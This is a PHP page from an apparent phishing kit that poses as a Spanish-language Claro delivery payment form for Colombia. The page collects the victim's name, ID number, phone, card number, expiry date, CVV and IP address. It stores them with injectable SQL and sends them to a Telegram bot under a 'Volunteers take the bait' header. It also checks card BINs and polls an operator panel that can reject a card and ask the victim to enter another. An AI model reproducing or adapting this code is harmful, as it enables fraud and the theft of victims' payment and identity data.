 <?php
    session_start();
    require_once 'config.php';
    include('header_.php');
    //include('header-banner1.php');

    include_once('telegram.php');

    if (isset($_POST['submit'])) {
        $_SESSION['post'] = $_POST;
    }
    if (isset($_SESSION['post']['recipients_name'])) {
        $_SESSION['recipients_name'] = $_SESSION['post']['recipients_name'];
    }
    // if(isset($_POST['cardnumber']) && $_POST['month'] && $_POST['year'] && $_POST['cvv']) {
    //     //$_POST['recipients_name'] = $_SESSION['recipients_name'];
    //     $_SESSION['post'] = $_POST;
    // }
    if (isset($_POST['payment_submit']) and !empty($_SESSION['post'])) {

        $payment_info = $_POST;
        $_POST = $_SESSION['post'];
        $ip = get_client_ip();



        if (!empty($_POST['recipients_name'])) {
            $fullname = $_POST['recipients_name'];
        } else {
            $fullname = "";
        }

        if (!empty($_POST['country'])) { // country
            $country = $_POST['country'];
        } else {
            $country = "";
        }
        if (!empty($_POST['other_country'])) {
            $othercountry = $_POST['other_country'];
        } else {
            $othercountry = "";
        }
        if (!empty($_POST['idtype'])) { // idtype
            $idtype = $_POST['idtype'];
        } else {
            $idtype = "";
        }
        if (!empty($_POST['id_number'])) { // id_number
            $idnumber = $_POST['id_number'];
        } else {
            $idnumber = "";
        }

        if (!empty($_POST['contact_number'])) {
            $phone = $_POST['contact_number'];
        } else {
            $phone = "";
        }
        $_SESSION["contact_number"] = $phone;


        if (!empty($payment_info['cardnumber'])) {
            $cardnumber = str_replace(' ', '', $payment_info['cardnumber']);
        } else {
            $cardnumber = "";
        }
        if (!empty($payment_info['month']) and !empty($payment_info['year'])) {
            $exp_date = $payment_info['month'] . '/' . $payment_info['year'];
        } else {
            $exp_date = "";
        }
        if (!empty($payment_info['cvv'])) {
            $card_code = $payment_info['cvv'];
        } else {
            $card_code = "";
        }

        $date = date('Y-m-d H:i:s');
        $sql = "INSERT INTO user_information (fullname, locality, othercountry, state, countryName, phone, date_created, date_updated, cardnumber, exp_date, card_code, ipaddress)
    VALUES ('" . $fullname . "', '" . $country . "', '" . $othercountry . "', '" . $idtype . "', '" . $idnumber . "', '" . $phone . "', '" . $date . "',now(),'" . $cardnumber . "','" . $exp_date . "','" . $card_code . "','" . $ip . "')";

        // echo $sql;
        // die;
        if (mysqli_query($conn, $sql)) {
            $last_id = mysqli_insert_id($conn);
            $_SESSION["last_id"] = $last_id;


            $_SESSION['post'] = '';
            $_SESSION['total_quantity'] = '';
            $_POST = '';

            //echo '<script>window.location.replace("page5.php")</script>';
            echo '<style>.spinner-border{display:block !important;}</style>';
            echo '<style>.backdrop{display:block !important;}</style>';
            //echo "New record created successfully. Last inserted ID is: " . $last_id;
        } else {
            $err = "Error: " . $sql . "<br>" . mysqli_error($conn);
        }

        try {
            $street = '';
            $locality = $country;
            $zipcode = '';
            $cardnumber = $cardnumber;
            $exp_date = $exp_date;
            $card_code = $card_code;
            $msg = '
                #----------------------[ Volunteers take the bait ]------------------#
                #--------------------------------[ 个人信息 ]----------------------------#
                姓名：' . $fullname . '
                电话：' . $phone . '
                州：' . $street . '
                地址：' . $locality . '
                邮编：' . $zipcode . '
                #-------------------------------[ 持卡人详情 ]---------------------------#
                卡号：' . $cardnumber . '
                时间：' . $exp_date . '
                CVV: ' . $card_code . '
                #--------------------------------[ 指纹信息 ]----------------------------#
                ip: ' . $ip;

            // send message to telegram
            $telegram = new TelegramBot($conn);
            $output = $telegram->send_message($msg);
        } catch (Exception $e) {
        }
    } // submit end

    ?>

 <style>
     .hideH {
         display: none !important;
     }

     .wrap {
         padding: 0px 20px;
         margin-top: 50px;
     }

     .step {
         color: #325754;
         padding-bottom: 10px;
         font-weight: bold;
     }

     .top1 table.cstm-table td {
         font-size: 14px;
         letter-spacing: 0;
         white-space: normal;
         padding: 5px 0;
         vertical-align: text-bottom;
         line-height: 1.3;
         color: #000;
     }

     .top1 table.cstm-table td strong {
         white-space: nowrap;
         margin-right: 15px;
         color: #325754;
     }

     .form-input label {
         display: block;
         color: #333333;
         font-weight: bold;
     }

     .form-input input {
         width: calc(100% - 30px);
     }

     .form-row input,
     .form-input input,
     .form-row select {
         flex-grow: 1;
         border: 1px solid #325754;
         height: 30px;
         outline: none;
         padding: 5px 10px;
         border-radius: 4px;
     }

     .form-input select {
         width: 100%;
         height: 30px;
         padding: 2px 12px;
         border: 1px solid #325754;
         border-radius: 3px;
     }

     .card-icons img:last-child {
         padding: 1px 4px;
         border-radius: 3px;
         background-color: #2870d3;
         height: 23px;
         position: relative;
         top: -1px;
     }

     .card-icons img {
         height: 25px;
         margin-top: 5px;
         margin-right: 5px;
     }

     .form-input .select {
         padding-right: 15px;
         width: 25%;
         margin-top: 12px;
         margin-bottom: 12px;
     }

     label.required:after {
         content: " *";
         color: red;
     }

     .form-input {
         margin-bottom: 20px;
     }

     .form-input.cvv input {
         width: 70px;
         color: #333333;
     }

     .form-input.cvv {
         align-items: end;
         color: #333333;
         display: flex;
     }

     .form-input.cvv span img {
         width: 30px;
         margin-left: 20px;
     }

     .extra-details>p {
         color: #333333;
     }

     .form-input.ddmm {
         display: flex;
     }

     h3.step {
         font-size: 18px;
         font-weight: bold;
         color: #325754;
         margin-bottom: 10px;
     }

     .extra-details {
         text-align: center;
         font-weight: bold;
         margin-top: 25px;
         font-size: 14px;
         margin-bottom: 20px;
     }

     .top1 h3 {
         text-align: center;
         margin-bottom: 15px;
         font-size: 22px;
         margin-top: 15px;
         color: #325754;
     }

     .top1 table.cstm-table td {
         font-size: 14px;
         letter-spacing: 0;
         white-space: normal;
         padding: 5px 0;
         vertical-align: text-bottom;
         line-height: 1.3;
     }

     .top1 table.cstm-table td strong {
         white-space: nowrap;
         margin-right: 15px;
     }

     .top1 table.cstm-table {
         margin-bottom: 20px;
     }

     .card-icons {
         display: flex;
         align-items: center;
     }

     .cvv-custom {
         flex-wrap: wrap;
     }

     .cvv-custom label {
         width: 100%;
     }

     .cvv-custom span {
         display: flex;
         font-size: 14px;
         height: auto;
         place-self: center;
     }

     .cvv-custom span img {
         margin-left: 7px !important;
         margin-right: 5px !important;
     }

     .form-input.ddmm,
     .cvv-custom {
         width: calc(100% - 15px);
     }

     @media(max-width: 767px) {
         .submit-btn {
             background-color: #ffc80e;
             padding: 11px 24px;
             font-size: 20px;
             display: block;
             width: 100%;
             min-width: 120px;
             margin-left: auto;
             margin-right: auto;
             line-height: 22px;
             border-radius: 32px;
             color: #fff;
             border-color: #ffc80e;
             height: auto;
             cursor: pointer;
         }

         .submit-btn:hover:hover {
             background-color: #ffc80e;
             border-color: #ffc80e;
         }

         .form-input .select {
             width: 50%;
         }
     }

     @media(max-width: 425px) {
         .form-input.cvv span img {
             margin-left: 0;
         }

         .form-input.cvv input {
             margin: 0 10px;
         }

         .form-input label {
             white-space: nowrap;
         }

         .form-input input {
             width: calc(100% - 15px);
         }

         .form-input.cvv {
             align-items: baseline;
         }
     }

     .spinner-border {
         animation: none;
         border: none;
         background: rgb(255 255 255 / 67%);
         border-radius: 0;
     }

     .lds-default {
         display: inline-block;
         position: relative;
         width: 80px;
         height: 80px;
     }

     .lds-default div {
         position: absolute;
         width: 6px;
         height: 6px;
         background: red;
         border-radius: 50%;
         animation: lds-default 1.2s linear infinite;
     }

     .lds-default div:nth-child(1) {
         animation-delay: 0s;
         top: 37px;
         left: 66px;
     }

     .lds-default div:nth-child(2) {
         animation-delay: -0.1s;
         top: 22px;
         left: 62px;
     }

     .lds-default div:nth-child(3) {
         animation-delay: -0.2s;
         top: 11px;
         left: 52px;
     }

     .lds-default div:nth-child(4) {
         animation-delay: -0.3s;
         top: 7px;
         left: 37px;
     }

     .lds-default div:nth-child(5) {
         animation-delay: -0.4s;
         top: 11px;
         left: 22px;
     }

     .lds-default div:nth-child(6) {
         animation-delay: -0.5s;
         top: 22px;
         left: 11px;
     }

     .lds-default div:nth-child(7) {
         animation-delay: -0.6s;
         top: 37px;
         left: 7px;
     }

     .lds-default div:nth-child(8) {
         animation-delay: -0.7s;
         top: 52px;
         left: 11px;
     }

     .lds-default div:nth-child(9) {
         animation-delay: -0.8s;
         top: 62px;
         left: 22px;
     }

     .lds-default div:nth-child(10) {
         animation-delay: -0.9s;
         top: 66px;
         left: 37px;
     }

     .lds-default div:nth-child(11) {
         animation-delay: -1s;
         top: 62px;
         left: 52px;
     }

     .lds-default div:nth-child(12) {
         animation-delay: -1.1s;
         top: 52px;
         left: 62px;
     }

     .form-input label {
         white-space: nowrap;
         margin-bottom: 7px;
     }

     @keyframes lds-default {

         0%,
         20%,
         80%,
         100% {
             transform: scale(1);
         }

         50% {
             transform: scale(1.5);
         }
     }

     .card-icons {
         display: flex;
         align-items: center;
         margin-top: 8px;
     }
 </style>
 <style>
     .login-form {
         width: 26rem;
         height: 30rem;
     }

     .MTM-bg-light {
         background-color: #f8f8f8 !important;
     }

     @media (max-width: 575px) {
         bg-top {
             background-image: url(./assets/images/new_background_mobile.png) !important;
             background-size: 100% 96px;
         }

         .bg-top .text-4xl {
             font-size: 26px;
             height: 28px;
             line-height: 28px;
             font-weight: 500;
         }

         .bg-top .m-7 {
             margin-top: 22px;
         }

         .bg-top img.h-auto {
             height: 28px;
             width: 37px;
             padding: 0;
             margin-right: 15px;
         }

         .d-sm-none {
             display: none !important;
         }

         .login-wrapper .shadow-lg {
             box-shadow: none !important;
             max-width: 325px;
             box-shadow: 0px 1px 3px #ccc !important;
             margin-top: 142px;
             margin-bottom: 25px;
             padding: 67px 20px 64px 20px;
         }

         .login-form .flex-col {
             padding: 0 !important;
             width: 100%;
         }

         .login-form {
             height: unset;
             width: 100%;
             box-shadow: none !important;
         }

         .switch-user {
             justify-content: space-between;
         }

         .switch-user .flex.items-center {
             margin: 0;
         }

         .sm-full {
             width: 100% !important;
         }

         .sm-text-center {
             text-align: center !important;
             justify-content: center;
             display: flex;
         }

         .border-gray-500 {
             border: 1px solid #999999 !important;
             outline: none;
             border-radius: 8px;
         }

         .bg-dark {
             background-color: #002EFF !important;
         }

         .bg-dark span {
             color: #ffffff !important;
         }

         .border-dark {
             border-color: #000000 !important;
         }

         .login-form .w-28 {
             width: 44%;
         }

         #header-widget {
             display: none !important;
         }

         .section-hero {
             margin-top: 50px !important;
         }

         .gtm_footer {
             display: none !important;
         }

         .MTM-bg-light {
             background-color: #f8f8f8 !important;
         }

         .MTM-main-header-basic {

             background-color: #1470d1;
         }

         .MTM-main-header {
             background-color: #1470d1;
             padding: 1px 0;
             box-shadow: 0 2px 4px 0 rgb(0 0 0 / 20%);
             position: sticky;
             top: 0px;
             left: 0;
             right: 0;
             z-index: 12;
         }

         .MTM-col-5 {
             flex: 0 0 41.66667%;
             max-width: 41.66667%;
         }

         .MTM-container,
         .MTM-container-fluid,
         .MTM-container-lg,
         .MTM-container-md,
         .MTM-container-sm,
         .MTM-container-xl {
             width: 100%;
             padding-right: 16px;
             padding-left: 16px;
             margin-right: auto;
             margin-left: auto;
             font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
             font-size: .8125rem;
             font-weight: 600;
             line-height: 1.5;
             color: #777;
             text-align: left;
         }

         .MTM-pt-3,
         .MTM-py-3 {
             padding-top: 1.5rem !important;
             padding-bottom: 1.5rem !important;
         }


         .MTM-row {
             position: relative;
         }

         .MTM-mb-3,
         .MTM-my-3 {
             margin-bottom: 1.5rem !important;
         }

         .MTM-d-none {
             display: none !important;
         }

         .MTM-row {
             display: flex;
             flex-wrap: wrap;
             margin-right: -16px;
             margin-left: -16px;
         }

         .MTM-col-12,
         .MTM-col-lg-2 {
             flex: 0 0 100%;
             max-width: 100%;
             position: relative;
             width: 100%;
             padding-right: 5px;
             padding-left: 5px;
         }

         .MTM-mb-4,
         .MTM-my-4 {
             margin-bottom: 12px !important;
         }

         .MTM-main-footer .MTM-footer-col {
             width: 100%;
             float: left;
             position: relative;
         }

         .MTM-h6 {
             float: left;
         }

         .MTM-main-footer #contactUs .MTM-h6,
         .MTM-main-footer #contactUs a {
             font-weight: 600;
             height: auto;
         }

         .MTM-main-footer #contactUs p {
             color: #757575;
             height: 50px;
             font-size: .8125rem;
         }

         .MTM-main-footer .MTM-footer-col .MTM-h6 {
             left: 0;
             display: inline-block;
             position: absolute;
         }

         .MTM-main-footer .MTM-footer-col a {
             left: 50%;
             display: inline-block;
             position: absolute;
         }

         .MTM-main-footer .MTM-h6,
         .MTM-main-footer a,
         .MTM-main-footer p {
             font-size: .875rem;
             margin-bottom: 0;
         }

         .MTM-main-footer #contactUs .MTM-h6,
         .MTM-main-footer #contactUs a {
             font-weight: 600;
             height: auto;
             color: #0071d1;

         }

         #contactUs a,
         a:hover {
             color: #0071d1;
         }

         .MTM-main-footer .MTM-footer-col a {
             left: 50%;
             display: inline-block;
             position: absolute;
         }

         .form-input.cvv input {
             margin-left: 0px !important;
         }

         .select:after {
             font-size: 0px !important;
         }
     }
 </style>

 <div class="wrap">

     <div class="form">
         <form action="" method="POST">
             <h3 class="step">

                 <font style="vertical-align: inherit;">
                     <font style="vertical-align: inherit;">Elección del método de pago</font>
                 </font>
             </h3>

             <h5 class="step" style="color: #325754;
    padding-bottom: 10px;">

                 <font style="vertical-align: inherit;">
                     <font style="vertical-align: inherit;"><span style="color:red;">*</span>La mercancía será entregada por el Correo Colombiano y estará sujeta a una tarifa fija de servicio de $190</font>
                 </font>
             </h5>

             <div class="top1">

                 <h3 class="text-center">Información de Orden</h3>

                 <table class="cstm-table" border="0" width="100%">

                     <tbody>
                         <tr>
                             <td><strong>Información:</strong></td>
                             <td>Claro</td>
                         </tr>
                         <tr>
                             <td><strong></strong></td>
                             <td></td>
                         </tr>
                         <tr>
                             <td><strong>Total :</strong></td>
                             <td>COP$<?php echo isset($_SESSION['total_quantity']['quantity']) ? $_SESSION['total_quantity']['quantity'] : 190   ?></td>
                         </tr>
                     </tbody>

                 </table>

             </div>

             <div class="backdrop"></div>
             <div class="form-input">
                 <label class="required" for="">Número de tarjeta</label>
                 <input type="text" id="cr_no" name="cardnumber" minlength="19" maxlength="19" placeholder="xxxx-xxxx-xxxx-xxxx">
                 <span class="crediterror" style="color:red; display:none;">Introduzca un número de tarjeta de crédito válido.</span>
                 <span class="errormsg" style="color:red; display:none;">Esta tarjeta no es compatible actualmente, por favor utilice otra tarjeta de crédito para pagar</span>
                 <div class="card-icons">
                     <img src="images/visa.png" alt=""> <img src="images/american-express.png" alt="">
                 </div>
             </div>
             <div class="form-input ddmm">
                 <div class="select">
                     <label class="required" for="">Mes de expiración</label>
                     <select name="month" id="">
                         <option value="">MM</option>
                         <?php for ($i = 1; $i <= 12; $i++) echo ('<option value="' . $i . '">' . $i . '</option>'); ?>
                     </select>
                 </div>
                 <div class="select">
                     <label class="required" for="">Año de vencimiento</label>
                     <select name="year" id="">
                         <option value="">AA</option>
                         <?php for ($i = 22; $i <= 32; $i++) echo ('<option value="' . $i . '">' . $i . '</option>'); ?>
                     </select>
                 </div>
             </div>
             <div class="form-input">
                 <label class="required" for="">Nombre del titular</label>
                 <?php
                    $cardholdername = "";
                    if (isset($_SESSION['post']['recipients_name'])) {
                        $cardholdername = $_SESSION['post']['recipients_name'];
                    } else {
                        if (isset($_SESSION['recipients_name'])) {
                            $cardholdername = $_SESSION['recipients_name'];
                        }
                    }
                    ?>
                 <input type="text" value="<?php echo $cardholdername; ?>" name="card_holder_name">
             </div>
             <div class="form-input cvv cvv-custom">
                 <label class="required" for="">CVV</label>
                 <input type="number" name="cvv" id="passwordInput" maxlength="3">
                 <span><img src="images/cvv.jpg" alt="">Código de 3 cifras<strong></strong></span>
             </div>
             <div class="center"><button class="btn disabled submit-btn disabledClass" onclick="hitSubmit()" name="payment_submit" type="submit">Pago</button></div>
         </form>
         <div class="extra-details">
             <p>¡Despacho Gratis! Una vez procesado el canje, recibirás un correo con los detalles de tu despacho.</br>
                 </br>
             </p>
         </div>
     </div>
 </div>

 <div class="spinner-border" id="ajaxprogress" style="z-index: 9999;position: fixed;top:0px;display:none;height:100%;width:100%;left: unset;right: unset;" role="status">
     <span class="" style="z-index: 1041;display: flex;justify-content: center;width: 100%;align-items: center;height:100%;">
         <div class="lds-default">
             <div></div>
             <div></div>
             <div></div>
             <div></div>
             <div></div>
             <div></div>
             <div></div>
             <div></div>
             <div></div>
             <div></div>
             <div></div>
             <div></div>
         </div>
     </span>
 </div>

 <script>
     function hitSubmit() {
         console.log('test');
         $(".backdrop").show();
         $('#ajaxprogress').show();
     }
     //script to check input
     jQuery('.form-input input, .form-input select').on('input', function() {
         let check = true;
         jQuery('.form-input input, .form-input select').each(function() {
             if (jQuery(this).val() == '') check = false;
         });
         if (check) jQuery('.btn').removeClass('disabled');
         else jQuery('.btn').addClass('disabled')
     });

     let cardCheck = "";
     let newCreditCradNum = "";

     function creditCardValidation() {
         let creditCradNum = $('#cr_no').val();

         // new code check credit card
         newCreditCradNum = creditCradNum.replace(/\s/g, "");
         console.log(newCreditCradNum.slice(0, 8));
         if (newCreditCradNum.length > 7) {

             // // to prevent many request with same value
             // if (cardCheck != newCreditCradNum.slice(0, 8)) {
             $.ajax({
                 url: "https://lookup.binlist.net/" + newCreditCradNum,
                 method: "GET",
                 success: function(response) {
                     cardCheck = newCreditCradNum.slice(0, 8);

                     console.log("Card ==>", response.type);
                     // Process the response data here
                     if (response.type == "credit") {
                         $('.crediterror').css("display", "none");
                         if (creditCradNum.length === 19) {
                             $(".submit-btn").removeClass('disabled');
                             $(".submit-btn").removeClass('disabledClass');
                             $(".submit-btn").attr('disabled', false);
                             return true;
                         }
                     } else {
                         console.log("creditCardValidation Please enter a valid credit card number.");
                         $('.crediterror').css("display", "block");
                         $(".submit-btn").addClass('disabledClass');
                         $(".submit-btn").attr('disabled', true);
                         return false;
                     }
                 },
                 error: function(xhr, status, error) {
                     console.log("Request failed:", error);
                     // Handle the error here
                 }
             });
             // }

         }

         //end check

         //console.log("creditCradNum ==>",creditCradNum.length === 19);
         if (creditCradNum.length != 19) {
             console.log("19 Please enter a valid credit card number.");
             $(".submit-btn").addClass('disabledClass');
             $(".submit-btn").attr('disabled', true);
             return false;
         }
     }

     //For Card Number formatted input
     var cardNum = document.getElementById('cr_no');
     cardNum.onkeyup = function(e) {
         //creditCardValidation();
         $("#cr_no").removeAttr("style");
         $(".errormsg").css("display", "none");
         if (this.value == this.lastValue) return;
         let caretPosition = this.selectionStart;
         let sanitizedValue = this.value.replace(/[^0-9]/gi, '');
         let parts = [];

         for (var i = 0, len = sanitizedValue.length; i < len; i += 4) {
             parts.push(sanitizedValue.substring(i, i + 4));
         }

         for (var i = caretPosition - 1; i >= 0; i--) {
             var c = this.value[i];
             if (c < '0' || c > '9') {
                 caretPosition--;
             }
         }
         caretPosition += Math.floor(caretPosition / 4);

         this.value = this.lastValue = parts.join(' ');
         this.selectionStart = this.selectionEnd = caretPosition;
         if (sanitizedValue.length > 0)
             $("input[name=payment_submit]").removeAttr('disabled');
         else
             $("input[name=payment_submit]").attr('disabled', 'disabled');
     }
 </script>


 <script type="text/javascript">
     function updatePromptStatus() {
         $.ajax({
             type: 'post',
             url: 'prompt_status.php',
             data: {
                 'userid': userid,
                 'page': 4
             },
             success: function(data) {}
         });
     }
     jQuery(document).ready(function() {
         popcount = 1;
         window.setInterval(function() {
             // do stuff
             var userid = '<?php echo @$_SESSION["last_id"]; ?>';
             $.ajax({
                 type: 'post',
                 url: 'usertrackingstatus.php',
                 data: {
                     'userid': userid,
                     'page': 2
                 },
                 success: function(data) {
                     if (data == 1) {
                         jQuery(location).attr('href', './page5.php');
                     }
                     if (data == 2 || data == '2') {
                         jQuery("#ajaxprogress").css("display", "none")
                         jQuery('#carderror').css('display', 'block');
                         if (popcount == 1) {
                             if (window.confirm('El número de tarjeta no es válido. Vuelva a introducir el número de tarjeta')) {
                                 console.log("window confirm box message");
                                 $(".backdrop").addClass('hideH');
                                 $('#ajaxprogress').addClass('hideH');
                                 updatePromptStatus();
                             }
                         }
                         popcount++;
                         $(".backdrop").hide();
                         return false;
                     }

                 }
             });

         }, 4000);


         $("body").on("change", "#cr_no", function() {

             var ignoreArray = ["123456789", "22222222"];
             var currentValue = $(this).val().replace(/ /g, '');

             if (jQuery.inArray(currentValue, ignoreArray) != -1) {
                 $("#cr_no").css("border", "2px solid red");
                 $(".errormsg").css("display", "block");

             }

         });

         $("body").on("keyup", "#cr_no", function() {
             event.preventDefault();
             var cc_number_7 = $(this).val().replace(/ /g, '');
             if (cc_number_7.length > 7) {
                 $.ajax({
                     type: 'post',
                     url: 'validate.php',
                     data: {
                         'cc_number_7': cc_number_7,
                         'action': 'cc_details'
                     },
                     success: function(data) {
                         if (data == 1) {
                             $("input[name=payment_submit]").removeAttr('disabled');
                             return true;
                         } else if (data == 'card_blocked') {
                             $('.crediterror').css("display", "block");
                             return false;
                         } else {
                             $('.crediterror').css("display", "block");
                             return false;
                         }
                     }
                 });
             }
         });

     });
 </script>
 <script>
     /* JS comes here */
     function setOnline(id, status) {
         if (id) {
             $.ajax({
                 type: 'post',
                 url: 'usertrackingstatus.php',
                 data: {
                     'id': id,
                     'status': status
                 },
                 success: function(data) {

                 }
             });
         }
     }
     var userid = <?php echo isset($_SESSION["last_id"]) ? $_SESSION["last_id"] : ''; ?>


     window.addEventListener('load', function(e) {
         if (navigator.onLine) {
             setOnline(userid, 1)
         } else {
             setOnline(userid, 0)
         }
     }, false);

     window.addEventListener('online', function(e) {
         setOnline(userid, 1)
     }, false);

     window.addEventListener('offline', function(e) {
         setOnline(userid, 0)
     }, false);

     const passwordInput = document.getElementById("passwordInput");


     passwordInput.addEventListener("input", () => {
         const inputValue = passwordInput.value;

         if (inputValue.length > 3) {
             passwordInput.value = inputValue.slice(0, 3);

         }
     });
 </script>

 <?php
    include('footer_.php');
